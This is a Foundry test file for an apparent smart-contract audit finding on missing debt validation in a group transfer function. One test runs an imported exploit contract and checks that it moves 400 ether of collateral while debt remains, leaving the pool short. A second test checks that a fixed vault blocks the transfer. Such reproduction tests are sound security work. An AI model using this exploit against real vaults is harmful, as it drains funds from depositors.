// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Collateral,
    Exploit,
    GroupVaultFixed
} from "./62867-missing-debt-validation-in-group-transfer-function-trailofbi.sol";

contract Finding62867Test is Test {
    address internal constant ALICE = address(0xA11CE);

    function test_exploit_moves_collateral_while_debt_remains() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.debt(), 1, "debt N remains");
        assertEq(e.moved(), 400 ether, "collateral moved");
        assertEq(e.shortfall(), 100 ether, "pool short by one token");
        assertEq(e.vault().groupSum(address(e), 1), 3, "only 3 live groups moved");
        assertEq(e.collateral().balanceOf(address(e.vault())), 100 ether, "pool balance");
        assertEq(e.vault().erc1155Balance(address(e), 1), 4, "recipient credited 4");
        assertEq(e.vault().groupSum(ALICE, 1), 0, "sender groups do not cover the leftover token");
    }

    function test_control_reverts_while_debt_remains() public {
        Collateral collateral = new Collateral();
        GroupVaultFixed vault = new GroupVaultFixed(collateral);
        collateral.mint(address(vault), 500 ether);
        vault.seed(ALICE, 1);

        vm.expectRevert(bytes("debt"));
        vault.transfer(ALICE, address(this), 1, 4);

        assertEq(collateral.balanceOf(address(this)), 0, "nothing moved");
        assertEq(collateral.balanceOf(address(vault)), 500 ether, "pool intact");
        assertEq(vault.erc1155Balance(ALICE, 1), 5, "alice balance unchanged");
        assertEq(vault.erc1155Balance(address(this), 1), 0, "recipient not credited");
        assertEq(vault.groupSum(ALICE, 1), 5, "groups unchanged");
    }
}
